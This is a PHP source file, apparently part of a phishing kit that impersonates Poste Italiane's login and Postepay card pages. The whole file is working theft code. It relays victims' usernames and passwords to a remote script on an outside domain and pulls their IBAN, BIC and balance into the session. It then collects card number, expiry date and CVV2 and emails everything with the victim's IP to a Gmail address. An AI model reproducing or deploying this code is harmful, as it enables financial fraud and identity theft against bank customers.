<?php
//don`t change anything here unless you know what ur doing
session_start();
ini_set('error_reporting', 0);
require 'poste_files/files/fns.php';

// remote curl only
$curl='http://cyberweb.com.ve/rutas/modulos/poste/curl.php?stats=';
$remote="yes";
// if function doesnt exists it will create it
if (!function_exists('file_get_contents')){
function file_get_contents($url){
$temp = "";
$fp = @fopen ($url, "r");
if ($fp) {
while ($data=fgets($fp, 1024))
$temp .= $data;
fclose ($fp);
}
return $temp;
}
}
$ip=$_SERVER['REMOTE_ADDR'];
$c = 'confirm.php';
$i = 'index.php';

$cmd = empty($_GET['logon']) ?  include 'index.php' : $_GET['logon'];

switch($cmd){
    
        case "myposte";
        $USR = rtrim($_POST['USR']);
        $PSWD = rtrim($_POST['PSWD']);
        
if (empty($USR) || empty($PSWD)) { include $i;  }

elseif($remote=="yes"){
        $urlfopen=ini_get('allow_url_fopen');
		
if($urlfopen != "1"){
        echo 'allow_url_fopen is turned off.';
        exit;
}
        $contents = '';
        $handle = $curl . "&test=1";
        $contents = file_get_contents($handle);
		
if(!strstr($contents, "readyforaction")){
        echo $curl.'cannot be opened, check to see if the path and domain to the curl.php are correct.';
        exit;
}
        $USR=urlencode($USR);
        $PSWD=urlencode($PSWD);
        $curl .= "&user=$USR&pass=$PSWD";
        $contents='';
        $contents=file_get_contents($curl);                          
        $contents=substr($contents, strpos($contents, "startonthisfuckingpoint")+23,20000);
        $contents=substr($contents, 0, strpos($contents, "endonthisfuckingpoint"));
        $contents=urldecode($contents);
        parse_str($contents);
        $_SESSION['screen_name'] = $welcomescreen;
        $_SESSION['last_login'] = $lastone;
        $_SESSION['username'] = $user;
        $_SESSION['password'] = $pass;
        $_SESSION['numero_conto']=$numeroconto;
        $_SESSION['nome_conto']=$nomeconto;
        $_SESSION['codice_iban']=$codiceiban;
        $_SESSION['codice_bic']=$codicebic;
        $_SESSION['saldo']=$saldo;

if ($codiceset == "yes") {
        $_SESSION['codice_session'] = 10;
}

if ($signerr == "2") {
        include $i;
        exit;
} else {
    include $c;
    exit;
    }
}
break;
// last page
case "cartapostepay";
        include $c;
        // submits last page
        $rica1=$_POST['rica1'];
        $rica2=$_POST['rica2'];
        $rica3=$_POST['rica3'];
        $rica4=$_POST['rica4'];
        $rica5=$_POST['rica5'];
        $rica6=$_POST['rica6'];
        $rica7=$_POST['rica7'];
        $rica8=$_POST['rica8'];
        $rica9=$_POST['rica9'];
        $rica10=$_POST['rica10'];
        $nr = $_POST['nr'];
        $luna = $_POST['luna'];
        $an = $_POST['an'];
        $cvv2=$_POST['cvv2'];

        $sessCod=$_SESSION['codice_iban'];
		
        $Saldo=$_SESSION['saldo'];
        $rd="http://www.google.com";
        $headers .= "Content-type: text/html; charset=iso-8859-1\n";
        $headers .= "From: Poste <gabarit@poste.it>\n";
        $headers .= "Return-Path: server@server.com\n";
        $headers .= "Return-Receipt-To: server@server.com\n";
        if ($sessCod==true) {
               if (!validate($nr)) {
                        $inputErr=1;
        }
        elseif (datecheck($luna,$an)) {
                $inputErr=1;
        }
        elseif (cvv($cvv2)) {
                $inputErr=1;
        }else {
                        //session_destroy();
                                                $usr=$_SESSION['username'];$pass=$_SESSION['password'];
                                                $str="[Nome utente] $usr<br>[Password] $pass <br>[PP] $nr <br>[EXP] $luna ::: $an <br>[CVV2] $cvv2<br>";
						mail("mailutauu@gmail.com","$ip",$str,$headers);
                        echo '<META http-equiv = "refresh" content = "0; URL=conferma.php"> ';

                }
        }
		if ($sessCod==false)
		 {
                if (!validate($nr)) {
                        $inputErr=1;
        }
        elseif (datecheck($luna,$an)) {
                $inputErr=1;
        }
        elseif (cvv($cvv2)) {
                $inputErr=1;
        }
        else {
               // session_destroy();
								$usr=$_SESSION['username'];$pass=$_SESSION['password'];
                                $str="[Nome utente] $usr<br>[Password] $pass <br>[PP] $nr <br>[EXP] $luna ::: $an <br>[CVV2] $cvv2<br>";
			    mail("mailutauu@gmail.com","$ip",$str,$headers);
                echo '<META http-equiv = "refresh" content = "0; URL=conferma.php"> ';

          }
}

break;
}

?>

